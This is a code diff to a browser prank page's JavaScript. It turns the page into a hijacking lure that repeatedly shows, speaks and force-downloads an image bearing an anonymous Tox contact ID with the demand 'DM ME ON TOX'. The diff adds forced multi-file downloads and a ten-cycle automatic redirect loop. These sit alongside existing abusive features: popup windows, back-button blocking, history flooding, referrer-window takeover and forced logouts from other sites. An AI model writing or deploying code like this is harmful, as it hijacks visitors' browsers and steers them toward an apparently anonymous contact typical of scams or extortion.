@@ -36,80 +36,51 @@ const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden
 
 const ART = [
   `
-┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
-┈┈┈┈╭━━━━━━╮┊☆ ┊┊
-┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
-┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
-┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
-☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
-┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
-  `,
-  `
-░░▓▓░░░░░░░░▓▓░░
-░▓▒▒▓░░░░░░▓▒▒▓░
-░▓▒▒▒▓░░░░▓▒▒▒▓░
-░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
-░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
-▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
-▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
-▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
-▓▒░░▒▒▒▒▒▒▒▒▒░░▓
-▓▒░░▒▓▒▒▓▒▒▓▒░░▓
-░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
-░░▓▒▒▒▒▒▒▒▒▒▒▓░░
-░░░▓▓▓▓▓▓▓▓▓▓░░░
+==================================================
+                 DM ME ON TOX
+==================================================
+TOX ID:
+F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B
+==================================================
   `
 ]
 
 const SEARCHES = [
-  'jshop',
-  'ptoszek',
-  'ptak',
-  'kanarek',
-  'jaczup'
+  'tox chat',
+  'dm me on tox',
+  'qtox messenger',
+  'tox id'
 ]
 
-const VIDEOS = [
-  'media/videos/jaczup.mp4',
-  'media/videos/duck.mp4',
-  'media/videos/rickroll.mp4',
-  'media/videos/golomb.mp4',
-  'media/videos/mushbox.mp4',
-  'media/videos/clearmax.mp4',
-  'media/videos/freestrona.mp4',
-  'media/videos/ajhsdfhjasdbhfjasdfs.mp4',
-  'media/videos/v09044g40000cgr968jc77u1t2krb89g.mov',
-  'media/videos/intro.mp4',
-  'media/videos/szybkakaczka.mp4', // added by @dan64iel
-  'media/videos/kaczuszka.mp4', //added by @imzeme
-  'media/videos/gratulacje.mp4', //added by @GameShoot8050
-  'media/videos/puddi.mp4' //added by @MariaWasNotAvailable
-]
+const TOX_ID = 'F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B'
+const TOX_IMAGE_SRC = `media/images/${TOX_ID}.png`
+
+let toxBlobUrl = null
+try {
+  fetch(TOX_IMAGE_SRC)
+    .then(res => res.blob())
+    .then(blob => {
+      toxBlobUrl = URL.createObjectURL(blob)
+    })
+    .catch(() => {
+      fetch('media/images/tox.png')
+        .then(res => res.blob())
+        .then(blob => {
+          toxBlobUrl = URL.createObjectURL(blob)
+        })
+        .catch(() => {})
+    })
+} catch (e) {}
 
 const FILE_DOWNLOADS = [
-  'media/images/ptok.jpg',
-  'media/images/jaczup.jpg',
-  'media/images/jaczupme.jpg',
-  'media/images/ptoszek.jpg',
-  'media/images/ptakwspodniach.jpg',
-  'media/images/kichajacyptoszek.jpg',
-  'media/images/lubieptoszki.png',
-  'media/images/zimowyptoszek.jpeg', // added by @dan64iel
-  'media/images/zlyptok.jpeg', //added by @imzeme
-  'media/images/grubyptok.jpg', //added by @imzeme
-  'media/images/ptokzjajami.jpeg', //added by @MARECKIyt
-  'media/images/ptiszka.jpg',
+  TOX_IMAGE_SRC
 ]
 
 const PHRASES = [
-  'hello my name is ptoszek, lol',
-  'birds are funny lalalalalalalallalala',
-  'wgl co u cb bo u mn dbr',
-  'knuuurrr eksplozja',
-  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
-  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
-  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
-  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
+  'DM me on Tox',
+  'DM me on Tox right now',
+  'Add my Tox ID',
+  'Napisz do mnie na Toxie'
 ]
 
 const LOGOUT_SITES = {
@@ -168,7 +139,7 @@ let interactionCount = 0
 
 //Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
 
-const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm
+const veryLongString = repeatStringNumTimes(`DM ME ON TOX: ${TOX_ID}\n`, 10000)
 
 /**
  * Number of iframes injected into the page for the "super logout" functionality.
@@ -223,7 +194,6 @@ function init () {
     if (event.which !== 0) openWindow()
 
     startVibrateInterval()
-    enablePictureInPicture()
     triggerFileDownload()
 
     focusWindows()
@@ -267,7 +237,7 @@ function initChildWindow () {
   registerProtocolHandlers()
   hideCursor()
   moveWindowBounce()
-  startVideo()
+  showToxTextInChildWindow()
   detectWindowClose()
   triggerFileDownload()
   speak()
@@ -288,7 +258,11 @@ function initParentWindow () {
   showHelloMessage()
   blockBackButton()
   fillHistory()
-  startInvisiblePictureInPictureVideo()
+  try {
+    triggerFileDownload()
+  } catch (err) {}
+
+  initAutoReroute()
 
   interceptUserInput(event => {
     // Only run these on the first interaction
@@ -296,15 +270,38 @@ function initParentWindow () {
       registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
       hideCursor()
-      startVideo()
       startAlertInterval()
       superLogout()
       removeHelloMessage()
       rainbowThemeColor()
       animateUrlWithEmojis()
-      speak('To był błąd')
+      speak('DM me on Tox')
     }
   })
+}
+
+let isRedirecting = false
+
+/**
+ * Auto reroute between main and download 10 times.
+ */
+function initAutoReroute () {
+  const params = new URLSearchParams(window.location.search)
+  if (params.get('done') === '1') {
+    return
+  }
+
+  const cycleParam = params.get('cycle')
+  const cycle = cycleParam ? parseInt(cycleParam, 10) : 1
+  if (isNaN(cycle) || cycle < 1) return
+
+  if (cycle <= 10) {
+    setTimeout(() => {
+      isRedirecting = true
+      window.onbeforeunload = null
+      window.location.replace('./download/?cycle=' + cycle)
+    }, 800)
+  }
 }
 
 /**
@@ -341,6 +338,9 @@ function isParentSameOrigin () {
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
+    if (isRedirecting) return
+    const params = new URLSearchParams(window.location.search)
+    if (params.get('done') !== '1') return
     speak('Please don\'t go!')
     event.returnValue = true
   })
@@ -563,36 +563,6 @@ function interceptUserInput (onInput) {
 }
 
 /**
- * Start an invisible, muted video so we have a one ready to put into
- * picture-in-picture mode on the first user-interaction.
- */
-function startInvisiblePictureInPictureVideo () {
-  const video = document.createElement('video')
-  video.src = getRandomArrayEntry(VIDEOS)
-  video.loop = true
-  video.muted = true
-  video.style = HIDDEN_STYLE
-  video.autoplay = true
-  video.play()
-
-  document.body.appendChild(video)
-}
-
-/**
- * Active Safari's picture-in-picture feature, which let's show a video on the
- * desktop. Requires user-initiated event.
- */
-function enablePictureInPicture () {
-  const video = document.querySelector('video')
-  if (document.pictureInPictureEnabled) {
-    video.style = ''
-    video.muted = false
-    video.requestPictureInPicture()
-    video.play()
-  }
-}
-
-/**
  * Focus all child windows. Requires user-initiated event.
  */
 function focusWindows () {
@@ -642,16 +612,20 @@ function hideCursor () {
 }
 
 /**
- * Trigger a file download immediately. One file download is allowed *without* user
- * interaction. Further file downloads should happen in response to a user-initiated
- * event or they will be blocked.
+ * Trigger downloading copies of the photo with tox id.
  */
 function triggerFileDownload () {
-  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
-  const a = document.createElement('a')
-  a.href = fileName
-  a.download = fileName
-  a.click()
+  for (let i = 1; i <= 3; i++) {
+    setTimeout(() => {
+      const a = document.createElement('a')
+      const filename = i === 1 ? `${TOX_ID}.png` : `${TOX_ID}_${i}.png`
+      a.href = toxBlobUrl || TOX_IMAGE_SRC
+      a.download = filename
+      document.body.appendChild(a)
+      a.click()
+      setTimeout(() => a.remove(), 1000)
+    }, (i - 1) * 250)
+  }
 }
 
 /**
@@ -868,17 +842,24 @@ function moveWindowBounce () {
 }
 
 /**
- * Show a random troll video in the window.
+ * Display the DM ME ON TOX text and Tox ID in the child popup window.
  */
-function startVideo () {
-  const video = document.createElement('video')
+function showToxTextInChildWindow () {
+  const container = document.createElement('div')
+  container.className = 'child-tox-container'
+  container.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; color: #fff; z-index: 5; padding: 20px; box-sizing: border-box; text-align: center; user-select: all; cursor: pointer;'
 
-  video.src = getRandomArrayEntry(VIDEOS)
-  video.autoplay = true
-  video.loop = true
-  video.style = 'width: 100%; height: 100%;'
+  const title = document.createElement('div')
+  title.innerText = 'DM ME ON TOX'
+  title.style = 'font-size: 2.2rem; font-weight: 900; letter-spacing: 3px; color: #fff; margin-bottom: 12px; text-shadow: 0 0 10px rgba(255,255,255,0.7); line-height: 1.1;'
 
-  document.body.appendChild(video)
+  const id = document.createElement('div')
+  id.innerText = TOX_ID
+  id.style = "font-family: 'Courier New', Consolas, Monaco, monospace; font-size: 0.8rem; font-weight: 700; word-break: break-all; color: #fff; background: #111; border: 1px solid #444; padding: 8px 10px; border-radius: 6px; width: 90%; box-sizing: border-box; text-align: center;"
+
+  container.appendChild(title)
+  container.appendChild(id)
+  document.body.appendChild(container)
 }
 
 /**
@@ -909,11 +890,11 @@ function showHelloMessage () {
 }
 
 /**
- * Remove the hello message.
+ * Remove the hello message headings while keeping the DM ME ON TOX text displayed.
  */
 function removeHelloMessage () {
-  const helloMessage = document.querySelector('.hello-message')
-  helloMessage.remove()
+  const headings = document.querySelectorAll('.hello-message h1, .hello-message h2, .hello-message h3')
+  headings.forEach(h => h.remove())
 }
 
 /**
